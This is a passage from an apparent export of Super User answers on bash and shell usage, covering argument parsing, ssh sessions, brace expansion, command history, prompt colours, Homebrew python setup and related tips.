<p>But even if it worked according to the guideline, <code>-</code> would be unnecessary here because <code>bash</code> detects when its standard input is a pipe and acts accordingly (unless <code>-c</code> is given etc.). </p>

<p>Yet <code>-</code> doesn't work according to the guideline, it works like <code>--</code>. Still <code>--</code> is unnecessary here because there are no arguments after it.</p>

<p>In my opinion the last <code>-</code> changes nothing. The command would work without it.</p>

<p>To see how <code>--</code> and <code>-</code> can be useful in general, study the example below.</p>

<hr>

<p><code>cat</code> in my Kubuntu obeys both guidelines and I will use it to demonstrate usefulness of <code>-</code> and <code>--</code>.</p>

<p>Let a file named <code>foo</code> exist. This will print the file:</p>

<pre><code>cat foo
</code></pre>

<p>Let a file named <code>--help</code> exist. This won't print the file:</p>

<pre><code>cat --help
</code></pre>

<p>But this will print the file named <code>--help</code>:</p>

<pre><code>cat -- --help
</code></pre>

<p>This will concatenate the file named <code>--help</code> with whatever comes from the standard input:</p>

<pre><code>cat -- --help -
</code></pre>

<p>It seems you don't really need <code>--</code>, because you can always pass <code>./--help</code> which will be interpreted as a file for sure. But consider</p>

<pre><code>cat ""$file""
</code></pre>

<p>when you don't know beforehand what the content of the variable is. You cannot just prepend <code>./</code> to it, because it may be an absolute path and <code>./</code> would break it. On the other hand it <em>may</em> be a file named <code>--help</code> (because why not?). In this case <code>--</code> is very useful; this is a lot more robust command:</p>

<pre><code>cat -- ""$file""
</code></pre>
"
"Why does my remote process still run after killing an ssh session?","20679","<linux><bash><ssh>","16","<p>This behaviour stems from the lack of a controlling terminal for the running process. When the remote process does not have a controlling terminal, the remote ssh process handling your session is unable to kill the command, which is left hanging in a zombie state to be eventually cleaned up by init.</p>

<p>You can get around this by running it with a -t option, which gives it a controlling terminal. This will cause the process to terminate when you ctrl-c your ssh command remotely.</p>

<p>The <strong>-t</strong> option:</p>

<blockquote>
  <p>Force pseudo-tty allocation.  This can be used to execute arbitrary 
  screen-based
  programs on a remote
               machine, which can be very useful, e.g. when implementing
  menu services.  Multiple -t options
  force tty
               allocation, even if ssh has no local tty.</p>
</blockquote>

<p>Have a look at <strong>man ssh</strong> and <strong>man sshd</strong> when you use this option as there are other implications of having a controlling terminal, e.g. the ability to send escape characters. </p>
"
"list files numbered in a specific range","236484","<bash><range>","16","<p>Try this:</p>

<pre><code>for file in file{18..31}.txt
</code></pre>

<p>It's known as a ""sequence expression"" and it's part of Bash's <a href=""http://tiswww.case.edu/php/chet/bash/bashref.html#Brace-Expansion"" rel=""noreferrer"">brace expansion</a> feature. It works in Bash 3 and 4.</p>

<p>The increment feature is new to Bash 4. You probably have Bash 3.x. </p>

<p>In Bash 4, you can do:</p>

<pre><code>$ for i in {1..6..2}; do echo $i; done
1
3
5
</code></pre>

<p>But in Bash 3, you have to do this to get the same results:</p>

<pre><code>$ for ((i=1; i&lt;=6; i+=2)); do echo $i; done
</code></pre>

<p>The same form incrementing by one:</p>

<pre><code>$ for ((i=1; i&lt;=6; i++)); do echo $i; done
</code></pre>

<p>Any of the numbers can be variables or expressions. However, in a sequence expression the numbers have to be constants</p>

<p>Here is an example using that form on your files:</p>

<pre><code>for ((i=18; i&lt;=31; i++))
do
    echo ""file${i}.txt""
done
</code></pre>

<p>Another new feature of sequence expressions in Bash 4 is the ability to include leading zeros. This is useful if you want to create (and use) numbered files that can be properly sorted.</p>

<p>In Bash 4:</p>

<pre><code>touch file{001..010}.txt
</code></pre>

<p>would create files named ""file001.txt"" through ""file010.txt"". Their names will sort in the expected order. Without the leading zeros, ""file10.txt"" would sort before ""file1.txt"".</p>

<p>To work with the files, you can use the same leading zero syntax:</p>

<pre><code>for file in file{001..010}.txt; do echo ""$file""; done
</code></pre>

<p>In Bash 3, if you need leading zeros, you need to pad the value yourself: </p>

<pre><code>for i in {1..10}
do
    printf -v i '%03d' $i 
    echo ""file${i}.txt""
done
</code></pre>

<p>The <code>printf</code> statement will prepend the value of i with leading zeros so the width is 3, for example (""4"" becomes ""004"").</p>

<p><strong>Edit:</strong></p>

<p>Accommodating spaces in filenames is straightforward:</p>

<pre><code>$ touch ""space name ""{008..018..3}"" more spaces""
$ ls -l sp*
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000008 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000011 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000014 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000017 more spaces
$ for f in ""space name ""{008..018..3}"" more spaces""; do mv ""$f"" ""${f}.txt""; done
$ ls -l sp*
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000008 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000011 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000014 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000017 more spaces.txt
</code></pre>
"
"Runing a command without inheriting parent's environment","319043","<bash><shell><session>","16","<p>Here's an answer that doesn't require sudo privileges or the user's password, but still provides an environment like what you'd get on a fresh login.</p>

<pre><code>env -i HOME=""$HOME"" bash -l -c 'your_command'
</code></pre>

<p>Example:</p>

<pre><code>$ export ABC=123
$ env -i HOME=""$HOME"" bash -l -c 'env' | grep ABC
$ env HOME=""$HOME"" bash -l -c 'env' | grep ABC
ABC=123
</code></pre>

<p>Breaking this down for explanation:</p>

<ol>
<li><p><code>env -i HOME=""$HOME""</code>: Clears the environment. The <code>-i</code> sets up an empty environment with <em>no variables whatsoever</em>. This is problematic because it means that if you try to naively run <code>bash -l</code> it won't load your <code>.bash_profile</code> etc. because <code>HOME</code> isn't set. To mitigate this, we explicitly pass <code>HOME=""$HOME""</code>, creating an environment where <code>HOME</code> (and only <code>HOME</code>) is set.</p></li>
<li><p><code>bash -l -c ...</code>: Runs the desired command in a login shell. You'll want a login shell for this because we're starting from a clean environment and need to reload everything.</p></li>
</ol>

<p>Notably:</p>

<ul>
<li>This doesn't require sudo privileges (the <code>sudo</code> version does).</li>
<li>This doesn't require typing the user's password (the <code>su</code> version does).</li>
<li>This doesn't require running an SSH server and having a passwordless key that can be used to log back in to the machine (the <code>ssh</code> version does).</li>
</ul>
"
"View all files in a website's directory?","642555","<linux><bash><shell>","16","<p>I was just wondering the same thing. The following is probably not the most efficient solution, but it seems to work. It recreates the directory structure of the webserver locally. (Found the first command via <a href=""https://stackoverflow.com/questions/273743/using-wget-to-recursively-fetch-a-directory-with-arbitrary-files-in-it"">stackoverflow</a>)</p>

<pre><code>wget --spider -r --no-parent http://some.served.dir.ca/
ls -l some.served.dir.ca
</code></pre>
"
"How can I copy a (big) directory over another changing only the files that differ?","241191","<linux><bash><cp><file-transfer>","16","<p>You can use <code>rsync</code> to do this, the command I use is <code>rsync -tr ""folder to copy from"" ""folder to copy to""</code></p>

<p>e.g. <code>rsync -tr /home/me/stuff/* /home/me/otherstuff/</code></p>
"
"How can I enable the bash command history?","174306","<bash>","16","<p>At a Bash prompt, type the following commands and do the steps listed after each one:</p>

<pre><code>set -o | grep history
</code></pre>

<p>If you get ""history off"" then add this line at the end of your <code>~/.bashrc</code>:</p>

<pre><code>set -o history
</code></pre>

<p>Next try:</p>

<pre><code>echo $HISTFILE
echo $HISTSIZE
echo $HISTFILESIZE
</code></pre>

<p>If the first one is blank or <code>/dev/null</code>, add this line to the end of your <code>~/.bashrc</code>:</p>

<pre><code>HISTFILE=$HOME/.bash_history
</code></pre>

<p>If either of the last two print 0, set them to some number like the default of 500:</p>

<pre><code>HISTFILESIZE=500
HISTSIZE=500
</code></pre>
"
"How to a open a file in vim using pipe","769390","<linux><bash><vim><pipe><locate>","16","<p>You're nearly done:</p>

<pre><code>$ locate updatedb | head -1 | xargs vim
</code></pre>

<p>sometimes (under certain terminals) you need reset the terminal after editing.</p>

<pre><code>$ reset
</code></pre>
"
"How do I queue multiple files for copying on a Mac?","328708","<macos><bash><file-transfer><perl>","16","<h2>UltraCopier</h2>

<p><a href=""http://ultracopier.first-world.info/"" rel=""noreferrer"">UltraCopier</a> is a free and <em>cross-platform</em> copy utility that is currently in development, so it's not that neat and polished yet. Once you install it, it sits in your menu bar.</p>

<p>It manages a copy list that allows you to queue <em>copy</em> or <em>move</em> jobs, which are then sequentially processed. You can also define the copy process priority as well as the block size of the transfer.</p>

<p>With the new version you can group with similar source and/or destination, or just always or never.</p>

<p><img src=""https://i.stack.imgur.com/aKAHt.png"" alt=""enter image description here""></p>
"
"iTerm2: Alt-Dot functionality with Cmd-Dot","703911","<macos><bash><iterm2>","16","<p>This looks like part of the EMACS readline bash key bindings i.e. they appear to be key combinations that are used in EMACS and emulated or add-ons to bash, or something.  Mine work as yours do, unfortunately, but I have a workaround since you are speaking with respect to iTerm2:</p>

<p>Go into the Preferences for the profile of the Terminal session you'd like to inflict this upon, and establish the key-binding as illustrated thus:</p>

<p><img src=""https://i.stack.imgur.com/OTwVT.png"" alt=""enter image description here""></p>

<p>This is probably not the solution that you are looking for, however it should work for you in a pinch.</p>
"
"How to open a folder from terminal on a Mac?","289162","<mac><bash><terminal>","16","<p>navigate to the dir and type</p>

<pre><code>open .
</code></pre>
"
"How to print new line character with echo?","443994","<bash><shell><shell-script><newlines><echo>","16","<p>The new line character with the <code>echo</code> command is ""\n"". Taking the following example:</p>

<pre><code>echo -e ""This is line 1\nThis is line 2""
</code></pre>

<p>Would result in the output</p>

<pre><code>This is line 1
This is line 2
</code></pre>

<p>The ""-e"" parameter <em>is</em> important here.</p>
"
"What happens to running processes when I lose a remote connection to a *nix box?","143925","<linux><unix><bash><ssh><remote-access>","16","<p>Normally the processes will terminate upon disconnection, but the old SSH sessions could either be waiting to timeout, or they could have <a href=""http://www.snailbook.com/faq/background-jobs.auto.html"" rel=""nofollow noreferrer"">hung upon exit</a>, due to a race condition.</p>

<p>You should probably terminate the old sessions, although you don't necessarily have to.  Type <code>ps aux</code> on the console to list the processes, then <code>kill PID</code> for each hung ssh session, where PID is the PID (process ID) for that session.  The older, hung sessions should have lower PIDs than your current, new session.</p>

<p>If there is a long-running process that you specifically want to continue running even after you disconnect, you can prefix your command with nohup:</p>

<pre><code>nohup badblocks -nvs /dev/sda &amp;
</code></pre>
"
"How do I symlink each of the files in one directory to another directory?","244634","<linux><mac><command-line><bash>","16","<p>You can use (GNU) <code>cp</code> with the <code>--symbolic-link</code> option:</p>

<pre><code>prompt$ mkdir foo
prompt$ cd foo
prompt$ touch a b c
prompt$ mkdir ../bar
prompt$ cd ../bar
prompt$ cp --symbolic-link ../foo/* .
prompt$ ls -l
total 0
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 a -&gt; ../foo/a
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 b -&gt; ../foo/b
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 c -&gt; ../foo/c
prompt$
</code></pre>
"
"Where are config files located in WSL?","1547945","<linux><windows-10><bash><windows-subsystem-for-linux>","16","<p>I found my <code>etc</code> folder in:</p>
<pre><code>C:\Users\USER\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\etc
</code></pre>
<p>Note: I'm using WSL1 so as to be able to use VMware. WSL2 uses Hyper-V
which is incompatible with other virtualization hypervisors.
(<em>Edit: This is no longer true.</em>)</p>
<p>However, this is changing now and in the near future.
Recently both VirtualBox and VMware have released versions that support
Hyper-V and WSL2. You can learn more about it for
<a href=""https://www.virtualbox.org/wiki/Changelog-6.0"" rel=""nofollow noreferrer"">VirtualBox</a>
and
<a href=""https://blogs.vmware.com/workstation/2020/01/vmware-workstation-tech-preview-20h1.html"" rel=""nofollow noreferrer"">VMware</a>.
The VMware solution requires the soon to be released
<a href=""https://docs.microsoft.com/en-us/windows-insider/at-home/whats-new-wip-at-home-20h1"" rel=""nofollow noreferrer"">Windows 10 Build 20H1</a>, while VirtualBox is possibly
usable now.</p>
<p>This next version of Windows is also advertised as allowing greater
integration between Windows and WSL, perhaps even solving the problem
of concurrent updates of the same files from both subsystems.</p>
"
"Prefix to each output of a command on runtime","623112","<linux><command-line><bash><shell><bash-scripting>","16","<p>I assume that what you are doing in your allcommands.sh is:</p>

<pre><code>command1.sh
command2.sh
</code></pre>

<p>Just relace it with</p>

<pre><code>command1.sh | sed ""s/^/[command1] /""
command2.sh | sed ""s/^/[command2] /""
</code></pre>
"
"one sudo for multiple terminals","588632","<bash><shell><sudo>","16","<p>Turn off <code>tty_tickets</code>. See <a href=""http://www.sudo.ws/sudo/man/1.8.6/sudoers.man.html"" rel=""noreferrer""><code>sudoers(5)</code></a> for more information.</p>

<p>Run <code>visudo</code> and then add a line:</p>

<pre><code>Defaults !tty_tickets
</code></pre>
"
"ssh Permission denied only in cron job","463540","<bash><ssh><cron>","16","<p>Interactive commands and cron jobs run in different environments – in particular, <strong>an interactive session might have a SSH agent running, or a Kerberos TGT stored.</strong> Because of the way <code>ssh</code> orders authentication methods, you <em>cannot</em> be sure that your key is used just because you added the <code>-i</code> option.</p>

<ul>
<li><p>If a SSH agent is running, the <code>ssh</code> client always tries agent keys <em>before</em> using any explicitly-specified keys.</p></li>
<li><p>If the network uses Kerberos and a Kerberos TGT is present, OpenSSH will use it <em>before</em> trying public-key authentication.</p></li>
</ul>

<p>I don't know anything about your environment, but both of these possibilities are easy to check:</p>

<ol>
<li><p>Add <code>unset SSH_AUTH_SOCK</code> and <code>unset KRB5CCNAME</code> before the <code>ssh</code> command, <em>then</em> manually run the modified script.</p>

<p>This will prevent the script from seeing the agent or the Kerberos tickets, and will only use the explicitly-specified key.</p></li>
<li><p>Add the <code>-v</code> option to <code>ssh</code>. This will display more detail on how the authentication happens.</p></li>
</ol>

<p>You can also add <code>-oIdentitiesOnly=yes</code> to the <code>ssh</code> command; this will <a href=""http://www.openbsd.org/cgi-bin/man.cgi?query=ssh_config"" rel=""noreferrer"">force it to use the specified key</a>.</p>

<hr>

<blockquote>
  <p>And if you add tips on accessing the agent from cron - even better</p>
</blockquote>

<p>This is generally not recommended, since the agent is usually closely tied to your interactive login session. In particular, it's only started when you log in, and killed when you log out – and it needs your password to actually unlock the SSH keys (assuming they were password-protected).</p>

<p>You mentioned ""Keychain"" – is this the OS X program, or the Linux script? (I don't know much about the architecture of Mac OS X, but AFAIK it makes it <em>much</em> harder to access the user's ssh-agent from a cronjob...)</p>
"
"Change encoding of txt file","554349","<bash><encoding><echo>","16","<p>You can use <code>iconv</code> to convert the encoding of the file:</p>

<pre><code>iconv -f ascii -t utf16 file2.txt &gt; another.txt
</code></pre>

<p><code>another.txt</code> should then have the desired encoding.</p>

<p>You could also try this:</p>

<pre><code>echo $var | iconv -f ascii -t utf16 &gt; ""file2.txt""
</code></pre>
"
"When should I put configurations into .bashrc vs into. .bash_profile?","10634","<bash>","16","<p><a href=""http://joshstaiger.org/archives/2005/07/bash_profile_vs.html"" rel=""noreferrer"">This post</a> explains that <code>~/.bash_profile</code> is used for login shells, while <code>~/.bashrc</code> is used for other interactive shells. <a href=""http://www.linuxjournal.com/video/bash-startup-scripts-bashrc-and-bashprofile"" rel=""noreferrer"">Here's</a> a useful video as well, which gives the example of some printer settings as something you might want on a login shell. In the end, it really doesn't matter too much, it's just a semantics thing. Plus, as the article says:</p>

<blockquote>
  <p>... the point is generally moot because most people edit the files so one calls the other anyway.</p>
</blockquote>
"
"Ubuntu: Run the output of another command","1018390","<ubuntu><command-line><bash>","15","<p>You seem to have worked this out yourself, but you can use:</p>

<pre><code>$(command parameter1 parameter2)
</code></pre>

<p><strong>Edit of edit:</strong> the below is somewhat wrong, whilst it does run the command in a subshell, it turns out that the environment variables will still be available. Sorry for misleading people...</p>

<p><strong>Edit:</strong> that will run in a subshell, any unexported environment variables won't be used. If you want to run a command in the same shell, you need to use:</p>

<pre><code>eval $(command parameter1 parameter2)
</code></pre>

<p>Another answer given is to pipe through bash itself:</p>

<pre><code>echo 'uname -a' | bash 
</code></pre>

<p>That will also execute in a subshell, to run in the same shell you will need:</p>

<pre><code>echo 'uname -a' | bash -c
</code></pre>

<p>Incidentally, you can also use back ticks instead of the $() syntax, but it's <a href=""http://mywiki.wooledge.org/BashFAQ/082"" rel=""noreferrer"">not recommended</a>.</p>
"
"Replace backslash(""\"") with forward slash(""/"") in a variable in bash","1068031","<bash><bash-scripting>","15","<p>The correct substitution is</p>

<pre><code>home_mf=""${home//\\//}""
</code></pre>

<p>This breaks up as follows:</p>

<ul>
<li><code>//</code> replace every</li>
<li><code>\\</code> backslash</li>
<li><code>/</code> with</li>
<li><code>/</code> slash</li>
</ul>

<p>Demonstration:</p>

<pre><code>$ t='\a\b\c'; echo ""${t//\\//}""
/a/b/c
</code></pre>

<hr>

<p>An alternative that may be easier to read would be to quote the pattern and the replacement:</p>

<pre><code>home_mf=""${home//'\'/""/""}""
</code></pre>
"
"reverse history search with regular expressions","275262","<bash><history><zsh>","15","<h1>Custom widget <code>history-incremental-multi-search</code> for <code>zsh</code></h1>

<h2>Setup</h2>

<p>Create a directory and include it in your <code>$fpath</code> For example, I created a directory <code>~/.zsh/functions</code>, and the line <code>fpath=($HOME/.zsh/functions $fpath)</code> in my <code>.zshrc</code>.</p>

<p>Put the following in a file named <code>history-incremental-multi-search</code> in that directory. </p>

<pre><code>emulate -L zsh
setopt extended_glob

local oldbuffer=$BUFFER
local -i oldcursor=$CURSOR

local dir                # search direction
local chars              # input buffer
local -a words           # search terms
local -a found           # all history items that match first term
local -i hindex=$HISTNO  # current 
local -i lmatch          # last matched history item (for prev/next)

if [[ $WIDGET == *forward* ]]; then
    dir=fwd
else
    dir=bck
fi

function find-next {
    # split the input buffer on spaces to get search terms
    words=(${(s: :)chars})

    # if we have at least one search term
    if (( $#words )); then
        # get all keys of history items that match the first
        found=(${(k)history[(R)*$words[1]*]})
        if (( $#found )); then
            # search in widget direction by default
            # but accept exception in $1 for ""prev match""
            search-${1:-$dir}
        else
            # no matches
            lmatch=$HISTNO
        fi
    else
        # no search terms
        lmatch=$HISTNO
        BUFFER=$oldbuffer
        CURSOR=$oldcursor
    fi
}

function search-fwd {
    # search forward through matches
    local -i i
    for (( i = $#found; i &gt; 0; i-- )); do
        # but not before hindex as we're searching forward
        if [[ $found[$i] -gt $hindex ]]; then
            set-match $found[$i]
        fi
    done
}

function search-bck {
    # search backward through matches
    local -i i
    for (( i = 1; i &lt;= $#found; i++ )); do
        # but not beyond hindex as we're searching backward
        if [[ $found[$i] -lt $hindex ]]; then
            set-match $found[$i]
        fi
    done
}

function set-match {
    # match history item against all terms and select it if successful
    local match=1
    local -i i
    for (( i = 2; i &lt;= $#words; i++ )); do
        if [[ $history[$1] != *$words[$i]* ]]; then
            match=0
            break
        fi
    done
    if [[ $match -ne 0 ]]; then
        lmatch=$1
        BUFFER=$history[$1]
        CURSOR=$#BUFFER
        break
    fi
}

# display sub prompt
zle -R ""${dir}-i-search-multi:""

# handle input keys
while read -k; do
    case $REPLY in
        # next
        $'\C-n' )
            hindex=$lmatch
            find-next
            ;;
        # prev
        $'\C-p' )
            hindex=$lmatch
            if [[ $dir == fwd ]]; then
                find-next bck
            else
                find-next fwd
            fi
            ;;
        # break
        $'\e' | $'\C-g' )
            BUFFER=$oldbuffer
            CURSOR=$oldcursor
            break
            ;;
        # accept
        $'\C-m' | $'\C-j' )
            if [[ $lmatch -eq $HISTNO ]]; then
                BUFFER=$oldbuffer
                CURSOR=$oldcursor
            else
                HISTNO=$lmatch
            fi
            break
            ;;
        # erase char
        $'\C-h' | $'\C-?' )
            chars=$chars[1,-2]
            hindex=$HISTNO
            find-next
            ;;
        # erase word
        $'\C-w' )
            if [[ $chars =~ \  ]]; then
                chars=${chars% *}
            else
                chars=
            fi
            hindex=$HISTNO
            find-next
            ;;
        # kill line
        $'\C-u' )
            chars=
            hindex=$HISTNO
            find-next
            ;;
        # add unhandled chars to buffer
        * )
            chars=${chars}${REPLY}
            hindex=$HISTNO
            find-next
            ;;
    esac

    zle -R ""${dir}-i-search-multi: $words""
done
</code></pre>

<p>Put this in or source it from your <code>.zshrc</code>:</p>

<pre><code>autoload -U history-incremental-multi-search

# make new widgets from function
zle -N history-incremental-multi-search-backward history-incremental-multi-search
zle -N history-incremental-multi-search-forward history-incremental-multi-search

# bind the widgets to keys
bindkey '^Xr' history-incremental-multi-search-backward
bindkey '^Xs' history-incremental-multi-search-forward
</code></pre>

<hr>

<h2>Use</h2>

<p>You should now be able to initiate a backward incremental search with <kbd>Ctrl+X</kbd>, <kbd>r</kbd>, forward with <kbd>Ctrl+X</kbd>, <kbd>s</kbd>.</p>

<p>Type your search terms separated by space. Following keys are available to control it:</p>

<ul>
<li><p><kbd>← Backspace</kbd>: erase character</p></li>
<li><p><kbd>Ctrl+W</kbd>: erase word</p></li>
<li><p><kbd>Ctrl+U</kbd>: kill line</p></li>
<li><p><kbd>Ctrl+N</kbd>: next match</p></li>
<li><p><kbd>Ctrl+P</kbd>: previous match</p></li>
<li><p><kbd>Ctrl+G</kbd>/<kbd>Esc</kbd>: cancel search</p></li>
<li><p><kbd>Enter</kbd>: accept</p></li>
</ul>

<p>This solution can probably be simplified quite a bit. It's more a functional proof of concept, with lots of room for improvement.</p>
"
"I changed my ""HOME"" variable and now cannot find ""~/.bash_profile"" to change it back","1364748","<bash><mac><environment-variables>","15","<p>It's in the same place.</p>

<p>Before the change <code>~</code> expands to something like <code>/Users/YourUserName</code>, the shell finds your <code>.bash_profile</code> there. After the file gets sourced <code>~</code> expands to another path so <code>~/.bash_profile</code> no longer points to the relevant file. This is because in this context <code>~</code> means <code>$HOME</code>.</p>

<p>If you know the full path to your actual home directory, you can use it instead of <code>~</code>. In Mac it would probably look like this:</p>

<pre><code>nano /Users/YourUserName/.bash_profile
</code></pre>

<p>Or let your Bash look up your home directory in the user database rather than just looking at <code>$HOME</code>. This doesn't require you to remember anything:</p>

<pre><code>nano ~YourUserName/.bash_profile
</code></pre>

<p>Modifying your <code>HOME</code> variable without changing your actual home directory is not the best idea. Changing any user's home directory is an administrative task, usually regular users cannot do this.</p>
"
"Bash prompt to change color when I am logged into a server","1118683","<bash><shell><colors><bashrc>","15","<p>The remote prompt is set by the remote <code>~/.bashrc</code>. So you still need to copy it to the remote server. However, you can use a single <code>~/.bashrc</code> for all hosts, and set the prompt color based on hostname:</p>

<pre><code>[ ""$PS1"" ] || return 0                           # continue only when interactive
case $(hostname -s) in
laptop*)
    prompt_color='\033[48;5;16m\033[38;5;46m'    # green(46) on black(16)
    ;;
server*)
    prompt_color='\033[48;5;16m\033[38;5;196m'   # red(196) on black(16)
    ;;
esac
ORIG_PS1=$PS1                                    # in case needed
PS1='&lt;\['${prompt_color}'\]\h\[\033[m\]:\w&gt;\$ '
unset prompt_color
</code></pre>

<p>Notes:</p>

<ul>
<li><p>Don't set <code>PS1</code> if it's not already set (i.e., if the shell is not interactive). Testing if <code>PS1</code> is non-empty is a very common way to decide if the shell is interactive, and you don't want to confuse programs that do that. (Arguably a more accurate test is checking if <code>$-</code> contains <code>i</code>.)</p></li>
<li><p>If you want this code to run when logging into a remote server, you should have one of the profile files always source <code>~/.bashrc</code>. But I assume you know that.</p></li>
<li><p>In <code>PS1</code>, the escape codes must be enclosed in <code>\[...\]</code>.</p></li>
<li><p><code>\[033[m</code> resets foreground and background to default. So here, <code>:\w</code> appear in terminal foreground/background.</p></li>
<li><p><code>\[033[48;5;XXXm\033[38;5;YYYm</code> sets the background/foreground to <code>XXX</code>/<code>YYY</code>.</p></li>
<li><p>For a script that dumps the available colors, try <a href=""http://www.vim.org/scripts/script.php?script_id=1349"" rel=""noreferrer""><code>colortest</code></a>.</p></li>
<li><p>To check what the prompt would look like:</p>

<pre><code>echo -e ""&lt;\033[48;5;16m\033[38;5;196mhost\033[m:dir&gt;$ ""
</code></pre></li>
</ul>
"
"How to pass bash script arguments to a subshell","403263","<bash>","15","<p>Bash's <code>printf</code> command has a feature that'll quote/escape/whatever a string, so as long as both the parent and subshell are actually bash, this should work:</p>

<p>[Edit: as siegi pointed out in a comment, if you do this the obvious way there's a problem when no arguments are supplied, where it acts like there actually was a single empty argument. I've added a workaround below, wrapping the format string with <code>${1+}</code>, which only includes the format string <em>if the first argument is defined</em>. It's a bit of a kluge, but it does work.]</p>

<pre><code>#!/bin/bash

quoted_args=""$(printf ""${1+ %q}"" ""$@"")"" # Note: this will have a leading space before the first arg
# echo ""Quoted args:$quoted_args"" # Uncomment this to see what it's doing
bash -c ""other_tool -a -b$quoted_args""
</code></pre>

<p>Note that you can also do it in a single line: <code>bash -c ""other_tool -a -b$(printf ""${1+ %q}"" ""$@"")""</code></p>
"
"pip not working on hombrew python 2.7 install","915810","<macos><bash><python><homebrew><pip>","15","<p>Generally, <code>homebrew</code> will install a <code>formula</code> into <code>/usr/local/Cellar/formula</code> and then place a link at <code>/usr/local/bin/formula</code>.</p>

<p>To make use of your installed formulae, make sure <code>/usr/local/bin</code> is in your <code>$PATH</code>. Show your <code>$PATH</code> by typing</p>

<pre><code>echo $PATH
</code></pre>

<p>If <code>/usr/local/bin</code> is not in your <code>$PATH</code>, put this line at the end of your <code>~/.profile</code> file.</p>

<pre><code>export PATH=""/usr/local/bin:$PATH""
</code></pre>

<p>Now, check what <code>pythons</code> are found on your OSX by typing:</p>

<pre><code>which -a python
</code></pre>

<p>There should be one python found at <code>/usr/bin/</code> (the Apple python) and one at <code>/usr/local/bin/</code> which is the Homebrew python.</p>

<pre><code>which python
</code></pre>

<p>will show you, which python is found first in your <code>$PATH</code>
and will be executed when you invoke <code>python</code>.</p>

<p>If you want to know, where the executable is, show it by typing</p>

<pre><code>ls -l $(which python)
</code></pre>

<p>This could look like this:
    lrwxr-xr-x  1 root   wheel        68  7 Mai 13:22 python -> /usr/local/bin/python</p>

<p>This will work for <code>pip</code> as well.</p>

<p>If you show the results of this steps, we can probably help you much easier.</p>

<p>-- UPDATE --</p>

<p>You have <code>/usr/local/bin/python</code> linked to <code>/usr/local/Cellar/python/2.7.9/bin/python</code>. -> <code>brew install python</code> worked.</p>

<p>show, if <code>pip</code> is installed by typing</p>

<pre><code>brew list python | grep pip
</code></pre>

<p>You should see</p>

<pre><code>/usr/local/Cellar/python/2.7.9/bin/pip
</code></pre>

<p>If not, check, if there are links, which are not done with <code>brew install</code>. Told you something like this: </p>

<pre><code>""Error: The `brew link` step did not complete successfully
The formula built, but is not symlinked into /usr/local""
</code></pre>

<p>To force the link and overwrite all conflicting files:</p>

<pre><code>brew link --overwrite python
</code></pre>

<p>To list all files that would be deleted:</p>

<pre><code>brew link --overwrite --dry-run python
</code></pre>

<p>** NO standard Apple <code>/usr/bin/python</code> **</p>

<p>link from <code>/usr/local/Cellar/python/2.7.9/bin/python</code> to <code>/usr/bin/python</code></p>

<pre><code>ln -s /usr/local/Cellar/python/2.7.9/bin/python /usr/bin/python
</code></pre>

<p>This is necessary for all python scripts beginning with <code>#!/usr/bin/python</code>. Especialy <code>easy_install</code> will fail, if link is not there.</p>

<p>Now, you are able to run</p>

<pre><code>easy_install pip
</code></pre>

<p>Hope, you're making progress</p>
"
"Who deals with the star * in echo *","901183","<bash><unix><shell><shell-script><stdin>","15","<p>bash (or whatever you use as shell), is the first thing to read any input, and will start interpreting special characters such as <code>?</code> and <code>*</code>. <code>*</code> gets expanded to whatever matches in the <a href=""http://en.wikipedia.org/wiki/Working_directory"" rel=""noreferrer"">CWD</a>, which means that the asterisk is substituted by said matches.</p>

<p>In most cases, this is fairly straght forward, but can lead to some confusing cases from time to time.</p>

<p>Consider the following.
A directory has this contents:</p>

<ul>
<li>test (regular file)</li>
<li>test1 (directory)</li>
<li>test2 (directory)</li>
<li>test3 (directory)</li>
</ul>

<p>If you then type <code>mv *</code> something seemingly weird happens: <code>test3</code> is there, but the rest is gone. While weird at first, it makes sense once you understand what bash actually passes to <code>mv</code>. Because of the asterisk, bash interprets <code>mv *</code> as <code>mv test test1 test2 test3</code>, and when mv gets that list, it'll assume that the last arguement is the destination, which is where all of the files would've been moved.</p>

<p>As for the commands you listed:</p>

<ul>
<li><code>echo *</code> can function as a poor-mans <code>ls</code>. The shell will expand the asterisk to whatever is in that directory, and as I'm sure you already know, <code>echo</code> will literally just echo anything bash passed to it as arguements.</li>
<li><code>cp temp temp*</code> will behave somewhat like the <code>mv</code> command I described above, unless there's only one directory named temp, in which case source and destination name is the same, i.e. it'll do nothing.</li>
</ul>
"
"Echo text in a certain color in a shell script","332223","<bash><shell-script>","15","<p>From ""<a href=""https://www.shellhacks.com/bash-colors/"" rel=""noreferrer"">ShellHacks: Bash Colors</a>"":</p>

<pre><code>echo -e ""\033[33mThis is yellow\033[0m""
</code></pre>

<p>or</p>

<pre><code>echo -e ""\e[33mThis is yellow\e[0m""
</code></pre>

<p><code>\033</code> or <code>\e</code> as an <a href=""http://en.wikipedia.org/wiki/Escape_character"" rel=""noreferrer"">Escape character</a> starts the escape sequence, which in this case contains the controls to change colors.</p>
"
"bash: colorized man page","452034","<bash><shell><colors><pager><man>","15","<pre><code>export LESS_TERMCAP_md=$'\E[0;33;5;74m'  # begin bold
export LESS_TERMCAP_us=$'\E[0;36;5;146m' # begin underline
</code></pre>

<p>In these two cases, all the colors and attributes are reset (0), the foreground color is switched to yellow/brown (33) or cyan (36), then blinking is turned on (5), and then something else also happens (74 or 146) which are probably undefined and not desired.</p>

<pre><code>export LESS_TERMCAP_so=$'\E[38;5;246m'
</code></pre>

